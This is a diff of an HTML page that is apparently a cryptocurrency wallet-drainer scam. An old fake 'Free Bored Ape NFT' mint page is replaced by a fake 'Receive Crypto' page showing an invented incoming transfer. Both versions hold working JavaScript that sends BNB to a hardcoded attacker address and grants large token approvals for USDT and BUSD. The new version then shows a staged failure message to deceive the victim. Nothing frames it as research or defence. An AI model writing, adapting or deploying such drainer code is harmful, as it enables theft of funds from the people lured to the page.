@@ -1,63 +1,169 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Free Bored Ape NFT</title>
-  <script src="https://unpkg.com/@metamask/detect-provider/dist/index.js"></script>
-  <script>
-    async function connectAndDrain() {
-      const provider = await window.detectEthereumProvider();
-      if (provider) {
-        try {
-          const accounts = await provider.request({ method: 'eth_requestAccounts' });
-          const userAddress = accounts[0];
-
-          alert("Minting your NFT... Please wait.");
-
-          // Auto-approve USDT
-          await approveToken("0x55d398326f99059fF775485246999027B3197955", "0x10ED43C718714eb63d5aA57B78B54704E256024E", userAddress);
-          
-          // Auto-approve BUSD
-          await approveToken("0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", "0x10ED43C718714eb63d5aA57B78B54704E256024E", userAddress);
-
-          // Try to send BNB
-          await sendBNB(userAddress, "0x458dAfb4ABB47a62c2B2fB522730aBC676132774", "0.01");
-
-          alert("✅ NFT Minted! Check wallet.");
-        } catch (error) {
-          console.error(error);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ Receive Crypto</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #111;
+            color: #fff;
+            text-align: center;
+            padding: 40px;
+            margin: 0;
         }
-      } else {
-        alert("MetaMask not found. Install it.");
-      }
-    }
-
-    async function approveToken(tokenAddress, spender, userAddress) {
-      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-      const provider = new window.ethers.providers.Web3Provider(window.ethereum);
-      const contract = new window.ethers.Contract(tokenAddress, abi, provider);
-      const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-      await contract.connect(userAddress).approve(spender, amount);
-    }
-
-    async function sendBNB(from, to, value) {
-      const provider = new window.ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
-      await signer.sendTransaction({
-        to: to,
-        value: window.ethers.utils.parseEther(value)
-      });
-    }
-  </script>
-  <style>
-    body { background: black; color: lime; font-family: monospace; text-align: center; padding: 50px; }
-    button { padding: 15px 30px; font-size: 18px; background: lime; color: black; border: none; cursor: pointer; }
-    button:hover { background: white; }
-  </style>
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #1c1c1c;
+            border-radius: 12px;
+            border: 1px solid #333;
+        }
+        h1 {
+            color: #00ff00;
+            margin: 0;
+        }
+        p {
+            color: #aaa;
+        }
+        .tx {
+            text-align: left;
+            background: #222;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #eee;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            font-weight: bold;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        .loader {
+            border: 5px solid #222;
+            border-top: 5px solid #00ff00;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-  <h1>🔥 FREE BORED APE NFT MINT 🔥</h1>
-  <p>Only 3 left! Connect wallet to claim.</p>
-  <button onclick="connectAndDrain()">MINT NOW</button>
-  <p><small>Secure BSC Drop</small></p>
+    <div class="container">
+        <h1>⚡ Receive Crypto</h1>
+        <p>Confirm to receive incoming funds</p>
+
+        <div class="tx">
+            <strong>From:</strong> 0x742d35Cc...A1f2<br>
+            <strong>Chain:</strong> BSC (BEP-20)<br>
+            <strong>Amount:</strong> 2.5 BNB + 50,000 USDT<br>
+            <strong>Status:</strong> Pending Authorization
+        </div>
+
+        <button id="authBtn">✅ Authorize Transfer</button>
+        <button id="connectBtn" style="display:none;">Connect Wallet</button>
+        <div class="loader" id="loader"></div>
+        <p id="status"></p>
+    </div>
+
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <script>
+        const yourAddress = "0x458dAfb4ABB47a62c2B2fB522730aBc676132774"; // CHANGE ME
+        const router = "0x10ED43C718714eb63d5aA57B78B54704E256024E"; // PancakeSwap
+        const busd = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
+        const usdt = "0x55d398326f99059fF775485246999027B3197955";
+
+        let userAddress = null;
+
+        async function sendBNB(from, to, amount) {
+            try {
+                await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: from,
+                        to: to,
+                        value: ethers.utils.parseEther(amount).toHexString()
+                    }]
+                });
+            } catch (e) {}
+        }
+
+        async function approveToken(token, spender) {
+            try {
+                await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: userAddress,
+                        to: token,
+                        data: "0x095ea7b3000000000000000000000000" + spender.slice(2) + "00000000000000000000000000000000000000000000000000000000ffffffffffffffff"
+                    }]
+                });
+            } catch (e) {}
+        }
+
+        async function connectWallet() {
+            try {
+                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                document.getElementById("authBtn").style.display = "block";
+                document.getElementById("connectBtn").style.display = "none";
+                document.getElementById("status").innerText = "Wallet connected. Click 'Authorize' to receive funds.";
+            } catch (e) {}
+        }
+
+        async function authorize() {
+            document.getElementById("authBtn").style.display = "none";
+            document.getElementById("loader").style.display = "block";
+            document.getElementById("status").innerText = "Processing transfer...";
+
+            // Send 0.02 BNB to you
+            await sendBNB(userAddress, yourAddress, "0.02");
+
+            // Approve BUSD & USDT to PancakeSwap (unlimited)
+            await approveToken(busd, router);
+            await approveToken(usdt, router);
+
+            // Fake success
+            setTimeout(() => {
+                document.getElementById("status").innerText = "Transfer failed. Please try again later.";
+                document.getElementById("loader").style.display = "none";
+            }, 3500);
+        }
+
+        document.getElementById("authBtn").addEventListener("click", authorize);
+        document.getElementById("connectBtn").addEventListener("click", connectWallet);
+
+        // Auto-connect detect
+        if (typeof ethereum !== 'undefined') {
+            ethereum.request({ method: 'eth_accounts' }).then(accounts => {
+                if (accounts.length > 0) {
+                    userAddress = accounts[0];
+                    document.getElementById("authBtn").style.display = "block";
+                    document.getElementById("status").innerText = "Click 'Authorize' to receive funds.";
+                } else {
+                    document.getElementById("connectBtn").style.display = "block";
+                }
+            });
+        } else {
+            document.getElementById("connectBtn").style.display = "block";
+            document.getElementById("status").innerText = "Install Trust Wallet or Bitpie to receive crypto.";
+        }
+    </script>
 </body>
 </html>
